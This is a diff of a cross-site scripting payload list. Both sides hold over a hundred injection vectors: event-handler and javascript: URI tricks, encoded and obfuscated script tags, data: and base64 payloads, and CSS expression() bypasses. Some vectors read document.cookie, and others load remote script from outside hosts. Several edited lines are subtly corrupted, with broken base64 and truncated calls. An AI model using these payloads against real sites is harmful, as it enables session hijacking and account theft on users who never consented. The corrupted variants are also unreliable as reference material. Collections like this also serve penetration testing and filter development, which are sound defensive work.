@@ -13,273 +13,147 @@
 <h1><font color=blue>hellox worldss</h1>
 <a href="javascript&colon;\u0061&#x6C;&#101%
 72t&lpar;1&rpar;"><button>
-
 <div onmouseover='alert&lpar;1&rpar;'>DIV</div>
-
 <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
- 
 <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
- 
-<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ​
- 
+<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ​ 
 <object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">​
- 
 <var onmouseover="prompt(1)">On Mouse Over</var>​
- 
 <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
- 
 <img src="/" =_=" title="onerror='prompt(1)'">
- 
 <%<!--'%><script>alert(1);</script -->
- 
 <script src="data:text/javascript,alert(1)"></script>
- 
 <iframe/src \/\/onload = prompt(1)
- 
 <iframe/onreadystatechange=alert(1)
- 
 <svg/onload=alert(1)
- 
 <input value=<><iframe/src=javascript:confirm(1)
- 
 <input type="text" value=``<div/onmouseover='alert(1)'>X</div>
- 
 http://www.<script>alert(1)</script .com
- 
- 
 <iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>​
-
 <svg><script ?>alert(1)
- 
 <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
- 
 <img src=`xx:xx`onerror=alert(1)>
- 
 <object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
- 
 <meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>​
- 
 <math><a xlink:href="//jsfiddle.net/t846h/">click
- 
 <embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>​
- 
 <svg contentScriptType=text/vbs><script>MsgBox+1
- 
 <a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
- 
 <iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
- 
 <script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
- 
 <script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
- 
-31) <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script​​​​​​​​​​​​
- 
-32) <object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
- 
-33) <script>+-+-1-+-+alert(1)</script>
- 
-34) <body/onload=&lt;!--&gt;&#10alert(1)>
- 
-35) <script itworksinallbrowsers>/*<script* */alert(1)</script ​
- 
-36) <img src ?itworksonchrome?\/onerror = alert(1)​​​
- 
-37) <svg><script>//&NewLine;confirm(1);</script </svg>
- 
-38) <svg><script onlypossibleinopera:-)> alert(1)
- 
-39) <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
- 
-40) <script x> alert(1) </script 1=2
- 
-41) <div/onmouseover='alert(1)'> style="x:">
- 
-42)  <--`<img/src=` onerror=alert(1)> --!>
- 
-43) <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>​
- 
-44) <div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>​
- 
-45) "><img src=x onerror=window.open('https://www.google.com/');>
- 
-46) <form><button formaction=javascript&colon;alert(1)>CLICKME
- 
-47) <math><a xlink:href="//jsfiddle.net/t846h/">click
- 
-48) <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>​
- 
-49) <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
- 
-50) <a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>​
- 
- 
-1) <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
- 
-2) <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
- 
-3) <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
- 
-4) <sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
- 
-5) <img/src=`%00` onerror=this.onerror=confirm(1)
- 
-6) <form><isindex formaction="javascript&colon;confirm(1)"
- 
-7) <img src=`%00`&NewLine; onerror=alert(1)&NewLine;
- 
-8) <script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
- 
-9) <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
- 
-10) <iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
- 
-11) <script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
- 
-12) &#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
- 
-13) <iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
- 
-14) <meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
- 
-15) <svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
- 
-16) <svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
- 
-17) <meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
- 
-18) <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
- 
-19) <form><a href="javascript:\u0061lert&#x28;1&#x29;">X
- 
-20) </script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
- 
-21) <img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
- 
-22) <form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
- 
-23) <a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
- 
-24) http://www.google<script .com>alert(document.location)</script
- 
-25) <a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
- 
-26) <img/src=@&#32;&#13; onerror = prompt('&#49;')
- 
-27) <style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
- 
-28) <script ^__^>alert(String.fromCharCode(49))</script ^__^
- 
-29) </style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
- 
-30) &#00;</form><input type&#61;"date" onfocus="alert(1)">
- 
-31) <form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
- 
-32) <script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
- 
-33) <iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
- 
-34) <a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
- 
-35) <script ~~~>alert(0%0)</script ~~~>
- 
-36) <style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
- 
-37) <///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
- 
-38) <img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
- 
-39) &#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
- 
-40) &#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
- 
-41) <marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
- 
-42) <div/style="width:expression(confirm(1))">X</div> {IE7}
- 
-43) <iframe/%00/ src=javaSCRIPT&colon;alert(1)
- 
-44) //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
- 
-45) /*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
- 
-46) //|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
- 
-47) </font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
- 
-48) <a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
- 
-49) </plaintext\></|\><plaintext/onmouseover=prompt(1)
- 
-50) </svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
+<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script​​​​​​​​​​​​
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1
+<SCRIPT>+-+-1-+-+ALERT(1)</SCRIPT>
+<BODY/ONLOAD=&LT;!--&GT;&#10ALERT(1)>
+<SCRIPT ITWORKSINALLBROWSERS>/*<script* */alert(1)</script ​
+<img src ?itworksonchrome?\/onerror = alert(1)​​​
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<svg><script onlypossibleinopera:-)> alert(1)
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+<script x> alert(</script 1=2
+<div/onmouseover='alert(1)'> style="x:">
+ <--`<img/src=` onerror=alert(1)> --!>
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>​
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>​
+"><img src=x onerror=window.open('https://www.google.com/');>
+<form><button formaction=javascript&colon;alert(1)>CLICKM>
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnoMik+></object>​
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>​
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+<img/src=`%00` onerror=this.onerror=confirm(1)
+<form><isindex formaction="javascript&colon;confirm(1)"
+<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
+<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
+<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
+<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
+<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+http://www.google<script .com>alert(document.location)</script
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<img/src=@&#32;&#13; onerror = prompt('&#49;'>
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+<script ^__^>alert(String.fromCharCode(49))</script ^__^
+</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+&#00;</form><input type&#61;"date" onfocus="alert(1)">
+<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<script ~~~>alert(0%0)</script ~~~>
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+<iframe/%00/ src=javaSCRIPT&colon;alert(1)
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(/*iframe/src*/>
+//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
 <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
 <input type="image" src="x" onerror="alert(/XSS/)" /> 
 <input type="image" src="denied:javascript:alert('XSS');" /><p onmouseover=alert(/XSS/)>Some very long paragraph goes here.</p>
-
 <var onmouseover=alert(/XSS/)>Some very long paragraph goes here.</var>
 <image src="" onerror="alert(/XSS/)" /> </XSS/*-*/STYLE=xss:e/**/xpression(alert(1337))>
-j
-
 <image src="http://somedomain/somegraphic.jpg" onload="alert(/XSS/)" /> 
 <p onmousemove="alert(/XSS/)">Long paragraph here</p> <SCRIPT>alert('XSS')</SCRIPT>
 <var onmousemove="alert(/XSS/)">Long paragraph here</var> 
 <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ ></object>
-
 <iframe src="data:text/html,<body %6fnload=alert(1)>"></iframe>
 <script>/*</script*>*/alert('XSS')</script>
-
-------------
 <iframe src=javascript:/&lt;img&#32;src=1&#32;onerror=[alert(1)]&gt/.source>
- 
-<iframe src=javascript:/%3cimg%20src=1%20onerror=[alert(1)]%3e/.source>
-
-<iframe src="data:text/html;base64,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="></iframe>​
-
+<iframe src=javascript:/%3cimg%20src=1%20onerror=[alert(1)]%3e/.source><iframe src="data:text/html;base64,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="></iframe>​
 <img src=x\
 onerror=alert(1)>
-
 <a href="data:text/html;jjencode,<body/onload %20= alert(navigator.userAgent)>">click</a>​
-
-
 <img src=asdf onerror=alert(document.cookie)>
 <div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="alert(/XSS/)" onclick="alert(/XSS/)"></div>
 <img src= alt=" onerror=prompt(1)//"><DIV STYLE="background-image: url(javascript:alert('XSS'))">
 <img src= alt=" hello=">" onerror=alert(1)> 
-
-
 <BODY ONLOAD=alert(‘XSS’)>
 alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 '';!--"<XSS>=&amp;amp;{()}
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
-
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 <IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>
 <IMG SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041>
 <IMG SRC="jav    ascript:alert('XSS');">
 <BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 "><iframe src=google.de></iframe>
-
 <BODY BACKGROUND="javascript:alert('XSS')">
-
 <FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
-
 <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
-
 “><script >alert(document.cookie)</script>
-
 %253cscript%253ealert(document.cookie)%253c/script%253e
-
 “><s”%2b”cript>alert(document.cookie)</script>
-
 %22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
-
 <img src=asdf onerror=alert(document.cookie)>
- 
 <img src=somevalidimage onreadystatechange=alert(1)>
 <image src=somevalidimage onreadystatechange=alert(1)>
-<isindex action=javascript:alert(1) type=image>
+<isindex action=javascript:alert(type=image>
 <applet onreadystatechange=alert(1)>
 <script onreadystatechange=alert(1)>
 <iframe onreadystatechange=alert(1)>
@@ -292,19 +166,15 @@ alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"
 <object type=image src=http://www.businessinfo.co.uk/labs/hackvertor/images/logo.gif onreadystatechange=alert(1)></object>
 <img type=image src=http://www.businessinfo.co.uk/labs/hackvertor/images/logo.gif onreadystatechange=alert(1)>
 <image type=image src=http://www.businessinfo.co.uk/labs/hackvertor/images/logo.gif onreadystatechange=alert(1)>
-
 Language attribute to force VBS:-
 <b alt=1 onmouseover=InputBox+1 language=vbs>test</b>
-
 Opera vectors work in certain conditions have to be triggered:-
 <table background=javascript:alert(1)>
 <table background=javascript&#14848:alert(1)>
 <table background=javascript&#14848&#14848&#14848&#14848&#14848:alert(1)>
 <div style="xss:ex&#47;&#42;&#79;&#77;&#71;&#42;&#47;pression(window.x?0:(alert(/XSS/),window.x=1));"></div>
-
 <video src=1 onerror=alert(1)>
 <audio src=1 onerror=alert(1)>
-
 <div style="xss:expression(window.x?0:(alert(/XSS/),window.x=1));"></div>
 <div style="\0078\0073\0073:\0065\0078\0070\0072\0065\0073\0073\0069\006f\006e(window.x?0:(alert(/XSS/),window.x=1));"></div>
 <div style="\0078 \0073 \0073: \0065 \0078 \0070 \0072 \0065 \0073 \0073 \0069 \006f \006e(window.x?0:(alert(/XSS/),window.x=1));"></div>
@@ -312,247 +182,35 @@ Opera vectors work in certain conditions have to be triggered:-
 <div style="xs\0s:e\x\pression\(window.x?0:(alert(/XSS/),window.x=1)\);"></div>
 <div style="\0078\0073\0073:\0065&#65279;\0078&#65279;\0070&#65279;\0072&#65279;\0065&#65279;\0073&#65279;\0073&#65279;\0069&#65279;\006f&#65279;\006e&#65279;(window.x?0:(alert(/XSS/),window.x=1));"></div>
 <div style="\0078\0073\0073&#62&#58&#92&#48&#48&#54&#53&#92&#48&#48&#55&#56&#92&#48&#48&#55&#48&#92&#48&#48&#55&#50&#92&#48&#48&#54&#53&#92&#48&#48&#55&#51&#92&#48&#48&#55&#51&#92&#48&#48&#54&#57&#92&#48&#48&#54&#102&#92&#48&#48&#54&#101(window.x?0:(alert(/XSS/),window.x=1));"></div>
-<div style="\0000000000078\0000000000073s:e&#x5c;&#x78;p/*tbeorhf*/ression(window.x?0:(alert(/XSS/),window.x=1));"></div>
-
-<meta charset="x-imap4-modified-utf7"&&>&&<script&&>alert(1)&&;&&<&&/script&&>
-
-<style>@import'vb\script:alert(1)</style>
-
-<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
-[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
-
-
+<div style="\0000000000078\0000000000073s:e&#x5c;&#x78;p/*tbeorhf*/ression(window.x?0:(alert(/XSS/),window.x=1));"></div><meta charset="x-imap4-modified-utf7"&&>&&<script&&>alert(1)&&;&&<&&/script&&><style>@import'vb\script:alert(1)</style><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 ><img src=x onerror=alert(XSS);>
-[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02] 
-
-
 ;!--"<XSS>=&{()}"
-[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
-
-
 <IMG SRC="javascript:alert('XSS');">
-[IE6.0|NS8.1-IE] [O9.02]
-
-
 <IMG SRC=javascript:alert('XSS')>
-[IE6.0|NS8.1-IE] [O9.02]
-
-        
 <IMG SRC=JaVaScRiPt:alert('XSS')>
-[IE6.0|NS8.1-IE] [O9.02]
-
-
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
-[IE6.0|NS8.1-IE] [O9.02]
-
-
 <IMG SRC=`javascript:alert("'XSS'")`>
-[IE6.0|NS8.1-IE]
-
-        
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
-[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
-
-
 <IMG SRC="jav   ascript:alert('XSS');">
-[IE6.0|NS8.1-IE] [O9.02]
-
-
 <IMG SRC="jav&#x09;ascript:alert('XSS');">
-[IE6.0|NS8.1-IE] [O9.02]
-        
-
 <IMG SRC="jav&#x0A;ascript:alert('XSS');">
-[IE6.0|NS8.1-IE] [O9.02]
-
-
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
-[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
-
-
 perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
-[IE7.0|IE6.0|NS8.1-IE]
-        
-
 <IMG SRC=" &#14;  javascript:alert('XSS');">
-[IE6.0|NS8.1-IE]
-        
-
 <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
-[NS8.1-G|FF2.0]
-        
-
 <<SCRIPT>alert("XSS");//<</SCRIPT>
-[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
-
-
 \";alert('XSS');//
-[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
-
-
 <IMG SRC='javascript:alert('XSS')
-[IE6.0|NS8.1-IE] [O9.02]
-
-
- <SCRIPT>alert(/XSS/.source)</SCRIPT>
-[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
-
-
+<SCRIPT>alert(/XSS/.source)</SCRIPT>
 <BODY BACKGROUND="javascript:alert('XSS')">
-[IE6.0|NS8.1-IE] [O9.02]
-
-
 </TITLE><SCRIPT>alert("XSS");</SCRIPT>
-[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
-
-
 <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
-[IE6.0|NS8.1-IE] [O9.02]
-
-
 <BODY ONLOAD=alert('XSS')>
-[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
-
-
 <IMG DYNSRC="javascript:alert('XSS')">
-[IE6.0|NS8.1-IE]
-
-
 <IMG LOWSRC="javascript:alert('XSS')">
-[IE6.0|NS8.1-IE]
-
-
 <BGSOUND SRC="javascript:alert('XSS');">
-[O9.02]
-
-
 <BR SIZE="&{alert('XSS')}">
-[NS4]
-
-
 <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
-[IE6.0|NS8.1-IE] [O9.02]
-
-
 <IMG SRC='vbscript:msgbox("XSS")'>
-[IE6.0|NS8.1-IE]
-     
-
 <IMG SRC="mocha:[XSS]">
-[NS4]
-
-
 <IMG SRC="livescript:[XSS]">
-[NS4]
-
-
-<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
-[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
-
-
-<TABLE BACKGROUND="javascript:alert('XSS')">
-[IE6.0|NS8.1-IE] [O9.02]
-
-
-<TABLE><TD BACKGROUND="javascript:alert('XSS')">
-[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
-
-
-<DIV STYLE="background-image: url(javascript:alert('XSS'))">
-[IE6.0|NS8.1-IE] 
-
-        
-<DIV STYLE="width: expression(alert('XSS'));">
-[IE7.0|IE6.0|NS8.1-IE]
-
-
-<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
-[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02] 
-   
-
-<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
-[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
-
-
-<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
-[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
-
-
-<TABLE BACKGROUND="javascript:alert('XSS')">
-[IE6.0|NS8.1-IE] [O9.02]
-
-    
-<TABLE><TD BACKGROUND="javascript:alert('XSS')">"
-[IE6.0|NS8.1-IE] [O9.02]
-        
-        
-<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
-[IE6.0|NS8.1-IE]
-
-
-<DIV STYLE="width: expression(alert('XSS'));">
-[IE7.0|IE6.0|NS8.1-IE]
-        
-
-<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
-[IE6.0|NS8.1-IE]
-
-
-<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
-[IE7.0|IE6.0|NS8.1-IE]
-
-       
-<XSS STYLE="xss:expression(alert('XSS'))">
